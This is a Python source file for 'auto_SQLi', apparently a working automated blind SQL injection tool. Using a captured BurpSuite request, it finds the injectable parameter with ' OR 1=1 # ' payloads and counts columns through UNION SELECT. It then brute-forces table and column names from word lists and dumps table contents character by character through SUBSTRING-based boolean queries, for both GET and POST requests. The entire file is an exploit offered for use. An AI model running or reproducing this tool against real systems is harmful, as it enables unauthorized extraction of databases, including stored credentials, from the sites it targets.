#!/usr/bin/python3
"""
Description:
	auto_SQLi, an automatic blind SQLi Tool.
	
Usage:
	auto_SQLi.py [-h] [-o <Output File Name>]
                    <Request File> <Tables Word List> <Columns Word List>
	Positional Arguments:
		<Request File>        File with request data. (Use BurpSuite)
		<Tables Word List>    Word list for table names.
		<Columns Word List>   Word list for column names.
	
	Optional Arguments:
		-h, --help           show this help message and exit
		-o <Output File Name>, --output <Output File Name>
							Name of your choice for the output file. (Default: Output.txt)
"""
from   bs4          import BeautifulSoup
from   urllib.parse import urlparse
import argparse
import pandas       as     pd
import requests
import string
import time

try:
	import Burpee.burpee as burp
except ImportError as import_error:
	exit(str(import_error) + "\nUnable to import burpee.Burpee. Make sure you have this module installed.\n"
	      "Try: https://github.com/xscorp/Burpee")

class Style:
	"""Class for formatting log file and terminal output."""
	BOLD      = '\033[1m'
	END       = '\033[0m'
	GREEN     = '\033[92m'
	RED       = '\033[91m'
	SEPARATOR = '------------------------------------------------------------------\n'
	TAB       = '\t'
	UNDERLINE = '\033[4m'
	YELLOW    = '\033[93m'
	good = '\033[92m[+]\033[0m'


# Defines the parser:
parser = argparse.ArgumentParser(description = 'An automatic blind SQLi Tool.')

# Arguments that can be supplied:
parser.add_argument('-o', '--output', type =  argparse.FileType('w'), metavar = '<Output File Name>',
                    help =     'Name of your choice for the output file. (Default: table.txt)', default =
                    'table.txt', action =                 'store', dest = 'output')
parser.add_argument('Request', type =         argparse.FileType('r'), metavar = '<Request File>', help =         'File with request data. (Use BurpSuite)')
parser.add_argument('TableNamesList', type =  argparse.FileType('r'), metavar = '<Tables Word List>', default =  'common-tables.txt', help =                                                 'Word list for table names.', nargs =  '?')
parser.add_argument('ColumnNamesList', type = argparse.FileType('r'), metavar = '<Columns Word List>', default = 'common-columns.txt', help =                                                'Word list for column names.', nargs = '?')

args = parser.parse_args()

# Arguments to be parsed:
column_names_list = args.ColumnNamesList
output_file       = args.output.name
request_file      = args.Request.name
table_names_list  = args.TableNamesList

def user_inputs():
	"""Defines the different outputs in the blind SQLi."""
	print(
		f"{Style.BOLD}{Style.UNDERLINE}Instructions:{Style.END}\nPlease provide the tool for the expected "
		f"outputs from the response in the blind SQLi you are trying.")
	SUCCESS = input(
		f"{Style.GREEN}Key string if injection was successful (Default: 'login successful'):{Style.END} ") or "login successful"
	WRONG = input(
		f"{Style.YELLOW}Key string if wrong parameters were given (Default: 'Wrong username or password'):{Style.END} ") or "Wrong username or password"
	DB_ERROR = input(
		f"{Style.RED}Key string if there was a database error exception (Default: 'database error'):{Style.END} ") or "database error"
	return SUCCESS, WRONG, DB_ERROR

def get_vars():
	"""Returns 2 variables:
param = The param that's getting injected.
url = Destination of the request."""
	referer     = headers.get('Referer')  # To get the URL Referer
	destination = burp.get_method_and_resource(request_file)[1]  # Where the referer sends the request
	parsed      = urlparse(referer)
	local_base  = f"{parsed.scheme}://{parsed.netloc}"
	url         = local_base + destination
	if METHOD == "POST":
		parameters = post_data.strip()
		param      = parameters[:parameters.index("=")]
		return param, url
	if METHOD == "GET":
		parameters = burp.get_method_and_resource(request_file)[1]
		param      = parameters[parameters.index("?"):]
		param      = param[1:param.index("=")]
		return param, url

# noinspection PyGlobalUndefined
def GET():
	"""Function that will be used if the request method from the <Request File> is GET."""
	global bracket, table_name, try_table, max_rows, retrieved_chars
	param, url,       = get_vars()
	closing_brackets  = ["\'", "\"", "0"]
	payload_extension = " OR 1=1 # "
	print(f"{Style.BOLD}[START] Injection Point Search...{Style.END}")
	for bracket in closing_brackets:
		r = requests.get(url, headers = headers, params = {param: bracket + payload_extension})
		message = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in message:
			print(f"{Style.BOLD}[FOUND] Injection point possible:{Style.END}\n"
			      f"{Style.TAB}Parameter: {param} ({METHOD})\n"
			      f"{Style.TAB}Payload: '{bracket + payload_extension}'\n")
			bracket = bracket
			break
	
	# Union Automation:
	union_auto    = f"{bracket} UNION SELECT 1"
	comment       = " # "
	column_number = 1
	print(f"{Style.BOLD}[START] Union Automation...{Style.END}")
	for _ in range(10):
		r = requests.get(url, headers = headers, params = {param: union_auto + comment})
		content = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in content:
			print(
				f"{Style.BOLD}[FOUND] Number of columns in the statement are:{Style.END} '{column_number}'\n"
				f"{Style.TAB}Payload: '{union_auto + comment}'\n")
			break
		union_auto = union_auto + (", " + str(column_number + 1))
		column_number += 1
	
	# Guessing Table Name from Word List:
	table_placeholder = union_auto.replace(str(column_number), "(SELECT 1 FROM X LIMIT 1)=1")
	print(f"{Style.BOLD}[START] Fetching Table Name (Brute-Forcing)...{Style.END}")
	for table_name in table_names_list.readlines():
		table_name = table_name.strip()
		try_table  = table_placeholder.replace("X", table_name)
		r = requests.get(url, headers = headers, params = {param: try_table + comment})
		content = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in content:
			print(f"{Style.BOLD}[FOUND] Table name in use:{Style.END} '{table_name}'\n"
			      f"{Style.TAB}Payload: '{try_table + comment}'\n")
			break
	
	# Guessing Column Names from Word List:
	found_columns      = 0
	columns            = []
	column_placeholder = try_table[:17] + try_table[17:].replace("1", "X", 1)
	print(f"{Style.BOLD}[START] Fetching {column_number} columns from table: '{table_name}'...{Style.END}")
	for column_name in column_names_list.readlines():
		column_name = column_name.strip()
		try_column  = column_placeholder.replace("X", column_name)
		r = requests.get(url, headers = headers, params = {param: try_column + comment})
		content = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in content:
			print(f"{Style.BOLD}[FOUND] Fetched column name from table '{table_name}':{Style.END} '{column_name}'\n"
			      f"{Style.TAB}Payload: '{try_column + comment}'\n")
			columns.append(column_name)
			found_columns += 1
			if found_columns == column_number:
				break
	
	# Guessing Number of Rows:
	CHARs     = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
	index_num = 1
	tries     = 0
	for X in range(999):
		if tries >= len(CHARs):
			break
		for char in CHARs:
			substring = f"{bracket} OR(SELECT BINARY SUBSTRING((SELECT {columns[0]} FROM {table_name} ORDER BY {columns[0]} LIMIT {X}, 1),{index_num},1)='{char}' FROM {table_name} LIMIT 1) = 1"
			r = requests.get(url, headers = headers, params = {param: substring + comment})
			content  = BeautifulSoup(r.content, "lxml").text
			tries   += 1
			max_rows = X
			if SUCCESS in content:
				tries = 0
				break
	print(f"{Style.BOLD}[FOUND] Fetched number of rows in table '{table_name}':{Style.END} {max_rows}")
	
	# Fetch All Data in Columns and Rows:
	data = []
	for column_name in columns:
		sublist = list()
		print(f"\n{Style.BOLD}[START] Fetching data for column: '{column_name}'...{Style.END}")
		for X in range(max_rows):
			index_tries     = 0
			retrieved_chars = []
			for index_num in range(99):
				if index_tries <= len(CHARs):
					pass
				else:
					break
				for char in CHARs:
					substring = f"{bracket} OR(SELECT BINARY SUBSTRING((SELECT {column_name} FROM {table_name} ORDER BY {column_name} LIMIT {X}, 1),{index_num},1)='{char}' FROM {table_name} LIMIT 1) = 1"
					r = requests.get(url, headers = headers, params = {param: substring + comment})
					content     = BeautifulSoup(r.content, "lxml").text
					index_tries += 1
					if SUCCESS in content:
						retrieved_chars.append(char)
						index_tries = 0
						break
			print(f"{Style.TAB}[FOUND] Row No. {X + 1}: Retrieved: {Style.GREEN}{Style.BOLD}" + "".join(
				retrieved_chars) + f"{Style.END}")
			sublist.append((column_name, "".join(retrieved_chars)))
		data.append(sublist)
		
	# Creating Data Frame, Printing Table and Saving to output file:
	df = pd.DataFrame([dict(subl) for subl in zip(*data)])
	print(f"\n{Style.BOLD}====== [FINISHED] ======\n{Style.UNDERLINE}Retrieved Table:{Style.END} "
		      f"{table_name}")
	print(df)
	print(f"\n[INFO] Table saved to output file: {output_file}")
	with open(output_file, 'w+') as output_F:
		output_F.write(f"====== [FINISHED] ======\nRetrieved Table: {table_name}\n{df}")
# ======================================================================================================================
# ======================================================================================================================
# noinspection PyGlobalUndefined
def POST():
	"""Function that will be used if the request method from the <Request File> is POST."""
	global bracket, table_name, try_table, max_rows, retrieved_chars, finish, start
	closing_brackets  = ["\'", "\"", "0"]
	param, url,       = get_vars()
	payload_extension = " OR 1=1 # "
	print(f"{Style.BOLD}[START] Injection Point Search...{Style.END}")
	for bracket in closing_brackets:
		r = requests.post(url, headers = headers, data = {param: bracket + payload_extension})
		content = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in content:
			print(f"{Style.BOLD}[FOUND] Injection point possible:{Style.END}\n"
			      f"{Style.TAB}Parameter: {param} ({METHOD})\n"
			      f"{Style.TAB}Payload: '{bracket + payload_extension}'\n")
			bracket = bracket
			break
	
	# Union Automation:
	column_number = 1
	comment       = " # "
	union_auto    = f"{bracket} UNION SELECT 1"
	print(f"{Style.BOLD}[START] Union Automation...{Style.END}")
	for _ in range(999):
		r = requests.post(url, headers = headers, data = {param: union_auto + comment})
		content = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in content:
			print(
				f"{Style.BOLD}[FOUND] Number of columns in the statement are:{Style.END} '{column_number}'\n"
				f"{Style.TAB}Payload: '{union_auto + comment}'\n")
			break
		union_auto = union_auto + (", " + str(column_number + 1))
		column_number += 1
	
	# Guessing Table Name from Word List:
	table_placeholder = union_auto.replace(str(column_number), "(SELECT 1 FROM X LIMIT 1)=1")
	print(f"{Style.BOLD}[START] Fetching Table Name (Brute-Forcing)...{Style.END}")
	for table_name in table_names_list.readlines():
		table_name = table_name.strip()
		try_table = table_placeholder.replace("X", table_name)
		r = requests.post(url, headers = headers, data = {param: try_table + comment})
		content = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in content:
			print(f"{Style.BOLD}[FOUND] Table name in use:{Style.END} '{table_name}'\n"
			      f"{Style.TAB}Payload: '{try_table + comment}'\n")
			break
	
	# Guessing Column Names from Word List:
	found_columns      = 0
	columns            = []
	column_placeholder = try_table[:17] + try_table[17:].replace("1", "X", 1)
	print(f"{Style.BOLD}[START] Fetching {column_number} columns from table: '{table_name}'...{Style.END}")
	for column_name in column_names_list.readlines():
		column_name = column_name.strip()
		try_column = column_placeholder.replace("X", column_name)
		r = requests.post(url, headers = headers, data = {param: try_column + comment})
		content = BeautifulSoup(r.content, "lxml").text
		if SUCCESS in content:
			print(f"{Style.BOLD}[FOUND] Fetched column name from table '{table_name}':{Style.END} '{column_name}'\n"
			      f"{Style.TAB}Payload: '{try_column + comment}'\n")
			columns.append(column_name)
			found_columns += 1
			if found_columns == column_number:
				break
	
	# Guessing Number of Rows:
	CHARs     = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
	index_num = 1
	tries     = 0
	for X in range(999):
		if tries >= len(CHARs):
			break
		for char in CHARs:
			substring = f"{bracket} OR(SELECT BINARY SUBSTRING((SELECT {columns[0]} FROM {table_name} ORDER BY {columns[0]} LIMIT {X}, 1),{index_num},1)='{char}' FROM {table_name} LIMIT 1) = 1"
			r = requests.post(url, headers = headers, data = {param: substring + comment})
			content  = BeautifulSoup(r.content, "lxml").text
			tries   += 1
			max_rows = X
			if SUCCESS in content:
				tries = 0
				break
	print(f"{Style.BOLD}[FOUND] Fetched number of rows in table '{table_name}':{Style.END} {max_rows}")
	
	# Fetch All Data in Columns and Rows:
	data = []
	for column_name in columns:
		sublist = list()
		print(f"\n{Style.BOLD}[START] Fetching data for column: '{column_name}'...{Style.END}")
		for X in range(max_rows):
			index_tries = 0
			retrieved_chars = []
			for index_num in range(99):
				if index_tries <= len(CHARs):
					pass
				else:
					break
				for char in CHARs:
					substring = f"{bracket} OR(SELECT BINARY SUBSTRING((SELECT {column_name} FROM {table_name} ORDER BY {column_name} LIMIT {X}, 1),{index_num},1)='{char}' FROM {table_name} LIMIT 1) = 1"
					r = requests.post(url, headers = headers, data = {param: substring + comment})
					content = BeautifulSoup(r.content, "lxml").text
					index_tries += 1
					if SUCCESS in content:
						retrieved_chars.append(char)
						index_tries = 0
						break
			print(f"{Style.TAB}[FOUND] Row No. {X + 1}: Retrieved: {Style.GREEN}{Style.BOLD}" + "".join(
				retrieved_chars) + f"{Style.END}")
			sublist.append((column_name, "".join(retrieved_chars)))
		data.append(sublist)
	
	# Creating Data Frame, Printing Table and Saving to output file:
	df = pd.DataFrame([dict(subl) for subl in zip(*data)])
	print(f"\n{Style.BOLD}====== [FINISHED] ======\n{Style.UNDERLINE}Retrieved Table:{Style.END} "
	      f"{table_name}")
	print(df)
	print(f"\n[INFO] Table saved to output file: {output_file}")
	with open(output_file, 'w+') as output_F:
		output_F.write(f"====== [FINISHED] ======\nRetrieved Table: {table_name}\n{df}")


if __name__ == "__main__":
	SUCCESS, WRONG, DB_ERROR = user_inputs()
	start = time.perf_counter()
	headers, post_data = burp.parse_request(request_file)
	METHOD = burp.get_method_and_resource(request_file)[0]  # Sets METHOD (POST \ GET)
	if METHOD == "POST": POST()
	if METHOD == "GET": GET()
	finish = time.perf_counter()
	print(f""
	      f"{Style.BOLD}{Style.good} Finished table dump in: {Style.BOLD}"
	      f"{Style.UNDERLINE}{round(finish - start, 2)}{Style.END} "
	      f"Seconds.")

